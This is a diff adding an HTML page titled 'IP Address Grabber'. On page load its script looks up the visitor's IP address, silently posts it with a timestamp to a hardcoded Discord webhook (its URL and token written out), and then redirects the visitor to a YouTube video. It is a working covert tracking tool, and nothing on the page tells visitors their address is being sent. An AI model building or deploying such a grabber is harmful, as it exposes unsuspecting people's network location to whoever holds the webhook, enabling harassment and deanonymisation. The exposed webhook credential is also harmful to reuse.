@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>IP Address Grabber</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Cool Site">
+    <meta name="author" content="DRQsuperior">
+  </head>
+  <body>
+    <h1>Your IP Address:</h1>
+    <p id="ip-address"></p>
+
+    <script>
+      const webhookURL = "https://discordapp.com/api/webhooks/1030643922986336367/gdykLU9rO8l4ykvsrMULgkHCyuc-rBi1WaMlL3YoOueHMiButmWPDLRmgf5bdpWKJsBt";
+
+      const ipifyURL = "https://api.ipify.org";
+
+      // Function to make a request to the IPify API and retrieve the user's IP address
+      async function getIPAddress() {
+        try {
+          const response = await fetch(ipifyURL);
+          const ipAddress = await response.text();
+          return ipAddress;
+        } catch (error) {
+          console.error(error);
+        }
+      }
+
+      // Function to send the IP address to the webhook URL via an HTTP POST request
+      async function sendIPAddress(ipAddress) {
+        try {
+          await fetch(webhookURL, {
+            method: "POST",
+            // Send the IP address in an embed
+            body: JSON.stringify({
+              embeds: [
+                {
+                  title: "IP Address",
+                  description: "```" + ipAddress + "```",
+                  timestamp: new Date(),
+                  thumbnail: {
+                    url:
+                      "https://media.tenor.com/L-8bvnEgNUsAAAAC/supblox-roblox.gif"
+                  },
+                  footer: {
+                    text: "Made by @DRQsuperior"
+                  }
+                }
+              ]
+            }),
+            headers: {
+              "Content-Type": "application/json"
+            }
+          });
+        } catch (error) {
+          console.error(error);
+        }
+      }
+
+      // Get the user's IP address
+      getIPAddress()
+        .then(ipAddress => {
+          // Display the IP address on the page
+          document.getElementById("ip-address").innerText = ipAddress;
+          // Send the IP address to the webhook URL
+          sendIPAddress(ipAddress);
+        })
+        .then(() => {
+          // Redirect the user to a different page
+          window.location.replace("https://www.youtube.com/watch?v=19RWsm-0N-I");
+        });
+    </script>
+  </body>
+</html>
